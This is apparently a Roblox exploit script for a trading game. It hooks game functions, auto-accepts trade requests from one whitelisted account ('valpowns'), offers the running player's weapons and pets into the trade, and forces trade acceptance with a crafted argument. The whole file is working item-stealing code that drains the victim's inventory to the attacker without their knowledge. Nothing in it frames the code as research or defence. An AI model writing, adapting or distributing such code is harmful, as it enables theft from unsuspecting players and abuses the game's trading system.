local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local TradeModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
local Trade = ReplicatedStorage:WaitForChild("Trade")

local Whitelist = { ["valpowns"] = true }

Trade.SendRequest.OnClientInvoke = function(Player)
    local Response = Whitelist[Player.Name] and Trade.AcceptRequest or Trade.DeclineRequest
    task.delay(0.2, function()
        Response:FireServer()
    end)
end

Trade.StartTrade.OnClientEvent:Connect(function(_, Player)
    if Whitelist[Player] then
        local PlayerData = Remotes:WaitForChild("Inventory"):WaitForChild("GetProfileData"):InvokeServer()
        PlayerData.Uniques = {}

        local Sorted = {}
        local Current = 0
        local InventoryModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("InventoryModule"))
        local Sorted = InventoryModule.SortInventory(InventoryModule.GenerateInventoryTables(PlayerData, "Trading"))

        for _, Type in { "Weapons", "Pets" } do
            for _, ItemName in Sorted.Sort[Type].Current do
                if ItemName == "DefaultGun" or ItemName == "DefaultKnife" then
                    continue
                end

                local Stuff = Sorted.Data[Type].Current[ItemName]
                for i = 1, Stuff.Amount do
                    Trade.OfferItem:FireServer(ItemName, Type)
                    wait()
                end

                Current += 1
                if Current >= 4 then
                    break
                end
            end
        end
    end
end)

local LastOffer

hookfunction(TradeModule.UpdateTrade, function(plr)
    LastOffer = plr.LastOffer
    return TradeModule.UpdateTrade(plr)
end)

Trade.AcceptTrade.OnClientEvent:Connect(function(Success)
    if not Success then
        Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastOffer)
    end
end)
